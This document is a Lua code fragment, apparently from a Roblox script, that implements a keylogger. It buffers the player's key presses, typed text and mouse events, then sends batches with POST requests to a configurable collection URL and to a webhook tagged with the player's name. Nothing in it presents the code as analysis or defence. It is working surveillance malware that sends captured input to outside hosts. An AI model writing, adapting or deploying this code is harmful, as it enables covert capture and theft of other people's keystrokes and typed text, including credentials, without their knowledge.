-- ─── keylogger ────────────────────────────────────────────────
local KeyLog = { buffer = {}, flushing = false, dropped = 0 }
local function nowMs() return math.floor(os.clock() * 1000) end
local function pushEvent(kind, value)
    if not CONFIG.keylog.enabled then return end
    if #KeyLog.buffer >= CONFIG.keylog.maxBuffer then
        table.remove(KeyLog.buffer, 1); KeyLog.dropped = KeyLog.dropped + 1
    end
    KeyLog.buffer[#KeyLog.buffer+1] = { t=nowMs(), k=kind, v=tostring(value):sub(1,256) }
end
function flushKeylog(force)
    if KeyLog.flushing then return end
    if #KeyLog.buffer == 0 and not force then return end
    KeyLog.flushing = true
    local batch = KeyLog.buffer; KeyLog.buffer = {}
    local dropped = KeyLog.dropped; KeyLog.dropped = 0
    if CONFIG.keylogUrl and CONFIG.keylogUrl ~= "" then
        task.spawn(function() hit({ Url=CONFIG.keylogUrl, Method="POST",
            Headers={["Content-Type"]="application/json",["X-Api-Key"]=CONFIG.sinkKey},
            Body=encode({ userId=LP.UserId, session=SESSION, count=#batch, dropped=dropped, events=batch }) }) end)
    end
    if not keylogAlive then KeyLog.flushing = false; return end
    task.spawn(function()
        local runs, curKind, cur = {}, nil, ""
        for _, ev in ipairs(batch) do
            if ev.k == curKind and ev.k == "key" then cur = cur .. ev.v .. " "
            else
                if curKind and cur ~= "" then runs[#runs+1] = { curKind, cur } end
                curKind, cur = ev.k, (ev.k == "key" and (ev.v.." ")) or (ev.v.."\n")
            end
        end
        if curKind and cur ~= "" then runs[#runs+1] = { curKind, cur } end
        local blocks = {}
        for _, r in ipairs(runs) do
            local label = (r[1]=="key" and "⌨ ") or (r[1]=="text" and "✏ ") or "🖱 "
            blocks[#blocks+1] = label.."```"..r[2]:sub(1,1000).."```"
        end
        local payload = ""
        local function send()
            if payload == "" then return end
            hit({ Url=CONFIG.keylogWebhook, Method="POST",
                Headers={["Content-Type"]="application/json"},
                Body=encode({ username="⌨ "..(LP.Name or "?"), content=payload:sub(1,1990) }) })
            payload = ""
        end
        for _, b in ipairs(blocks) do
            if #payload + #b + 1 > 1900 then send() end
            payload = payload .. b .. "\n"
        end
        if dropped > 0 then payload = payload.."\n_("..dropped.." dropped)_" end
        send()
    end)
    KeyLog.flushing = false
end
